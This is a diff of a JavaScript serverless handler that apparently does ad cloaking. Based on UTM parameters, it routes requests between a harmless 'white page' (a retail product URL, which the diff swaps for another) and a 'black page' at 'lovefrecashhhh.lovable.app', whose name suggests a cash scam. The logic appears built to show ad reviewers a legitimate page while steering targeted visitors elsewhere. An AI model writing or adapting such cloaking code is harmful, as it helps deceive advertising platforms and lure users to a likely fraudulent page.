@@ -1,6 +1,6 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://www.wilsonandfrenchy.com.au/products/bee-mine-organic-kimono-set?pr_prod_strat=e5_desc&pr_rec_id=3dd3ea9b3&pr_rec_pid=9070470332637&pr_ref_pid=9070429634781&pr_seq=uniform";
+    const whitePageURL = "https://www.mobileciti.com.au/tcl-rayneo-air-2-carry-case";
     const blackPageURL = "https://lovefrecashhhh.lovable.app/?";
   
     // Parse the UTM parameters from the request URL
@@ -26,6 +26,7 @@ export default function handler(req, res) {
     res.end();
 
   }
+
 
 
 
